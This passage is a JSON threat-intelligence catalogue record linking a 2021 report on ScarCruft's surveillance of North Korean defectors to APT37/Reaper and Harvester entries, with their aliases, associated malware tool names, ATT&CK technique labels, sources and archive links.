Collected Data: Archive via Library\n\nApplication Layer Protocol: Web Protocols\nEncrypted Channel: Symmetric Cryptography\n\n\n**Exfiltration** T1041 Exfiltration Over C2 Channel\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-29 - ScarCruft surveilling North Korean defectors and human rights activists.pdf"
    ],
    "report_names": [
        "2021-11-29 - ScarCruft surveilling North Korean defectors and human rights activists.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535748,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1653703520,
    "ts_modification_date": 1653703520,
    "files": {
        "pdf": "https://archive.orkl.eu/0a17af0c6b45549dfd58f559d07a0d789903caa3.pdf",
        "text": "https://archive.orkl.eu/0a17af0c6b45549dfd58f559d07a0d789903caa3.txt",
        "img": "https://archive.orkl.eu/0a17af0c6b45549dfd58f559d07a0d789903caa3.jpg"
    }
}